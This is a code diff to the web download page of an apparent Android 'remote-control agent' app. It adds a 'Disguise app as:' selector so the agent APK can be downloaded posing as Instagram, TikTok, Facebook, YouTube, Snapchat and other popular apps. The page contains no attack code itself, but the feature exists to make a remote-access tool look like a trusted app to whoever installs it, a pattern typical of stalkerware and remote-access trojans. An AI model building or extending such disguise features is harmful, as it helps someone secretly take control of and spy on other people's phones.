@@ -658,7 +658,19 @@
                             <span style="font-size:1.2rem;">&#128241;</span><br>APK
                         </button>
                     </div>
-                    <button class="download-btn" onclick="location.href='/static/downloads/remote-control-agent-release.apk'">Download APK</button>
+                    <label for="apk-icon" style="font-size:0.85rem;">Disguise app as:</label>
+                    <select id="apk-icon" style="margin:6px 0; padding:4px;">
+                        <option value="default">Remote Control</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="twitter">Twitter / X</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="linkedin">LinkedIn</option>
+                        <option value="messenger">Messenger</option>
+                        <option value="youtube">YouTube</option>
+                        <option value="snapchat">Snapchat</option>
+                        <option value="tiktok">TikTok</option>
+                    </select>
+                    <button class="download-btn" onclick="location.href='/static/downloads/remote-control-agent-'+document.getElementById('apk-icon').value+'.apk'">Download APK</button>
                     <div class="version-note">Version 0.1.0 &middot; Direct download</div>
                 </div>
 
